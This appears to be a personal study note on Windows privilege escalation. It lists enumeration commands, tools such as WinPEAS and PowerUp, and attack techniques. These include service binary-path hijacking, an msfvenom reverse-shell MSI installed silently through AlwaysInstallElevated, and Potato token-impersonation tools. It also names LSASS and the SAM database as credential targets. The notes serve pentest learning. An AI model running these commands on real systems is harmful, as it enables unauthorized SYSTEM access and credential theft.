---
tags: [basics, technique, windows, privesc]
---



Goal of Windows PrivEsc is to escalate from a low-privilege user to `Local Administrators` or `NT AUTHORITY\SYSTEM`.


## UAC Elevation Flow

![[uac_elevation_flowchart.png]]


## Initial Enumeration

```cmd
whoami /all                  # current user, groups, privileges
net user                     # list local users
net localgroup administrators
systeminfo                   # OS version, hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn  # patches
tasklist /SVC                # running processes with services
sc query state= all          # all services
```

```powershell
# PowerShell equivalents
Get-LocalUser
Get-LocalGroupMember Administrators
Get-Process
Get-Service
```

## Automated Tools

```powershell
# WinPEAS - comprehensive enum
.\winPEAS.exe

# PowerUp - misconfigurations
Import-Module .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt - situational awareness
.\Seatbelt.exe -group=all
```

## Common Attack Vectors

### Weak Service Permissions
```cmd
# Find services running as SYSTEM with weak permissions
sc qc <service-name>
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Replace the binary path if writable
sc config <service-name> binpath= "C:\path\to\shell.exe"
sc stop <service-name> && sc start <service-name>
```

### Unquoted Service Paths
```cmd
# List services with unquoted paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
# If path is C:\Program Files\MyApp\service.exe, place shell at C:\Program.exe
```

### AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both are 1: craft a malicious .msi and install it for SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### Token Impersonation (Potato Attacks)
If you have `SeImpersonatePrivilege` (common on service accounts):
```cmd
# PrintSpoofer (modern, Windows 10/Server 2019+)
PrintSpoofer.exe -i -c cmd

# GodPotato (broad Windows version support)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (older, pre-2019)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
```

## Important Concepts

- **LSASS** (Local Security Authority Subsystem Service) — handles authentication, stores credentials in memory. Target for Mimikatz.
- **SAM** database — stores local user hashes at `C:\Windows\System32\config\SAM`
- **SeImpersonatePrivilege** — allows impersonating client tokens; almost always leads to SYSTEM
- **SeDebugPrivilege** — allows attaching a debugger to any process, including SYSTEM ones 





### General Notes from the Windows Priv Esc Course 


Tools 
- Seatbelt
- winPEAS
- PowerUp
- SharpUp
- JAWS
- SessionGopher
- Watson
- LaZagne
- Windows Exploit Suggester - Next Gneration
- Sysinternal Suite 


General Enumeration:
- Always look at the routing Tables 

```cmd
# Check the network configuration
ipconfig /all

# Arp table 
arp -a 

# Routing table 
route print

# Check windows Defender Status 
Get-MpComputerStatus

# List AppLocker Rules 
Get-AppLockerPolicy -Effective | select -ExpandPorperty RuleCollections

## System information 

# show all running processes 
tasklist /svc

# show environment variables 
set

# Get systeminformation
systeminfo

# Patches and updates with QFE (Quick Fix Engineering)
wmic qfe

# Or with powershell
Get-HotFix | ft -Autosize


# Show running processes 
netstat -ano
  
# Show logged-In users 
query user 

# Current user
echo %USERNAME%

# Current user Priviliges 
whoami /priv

# current group infos
whoami /groups

# Show all users 
net user

# Get all groups f
net localgroup

# Details about a group
net localgroup administrators


# Get Password policies 
net accounts



```


```pwsh


# Get isntalled software 
Get-WmiObject -Class Win32_Product | select Name, Version


```

You should be familiar with standard Windows processes such as:
- Session Manager Subsystem smss.exe
- Client Server Runtime Subsystem csrss.exe
- WinLogon winlogon.exe
- Local Security Authority Subsystem Services LSASS
- Service Host svhost.exe
- 


Enumeration Protections by Windows:
- Microsoft AppLocker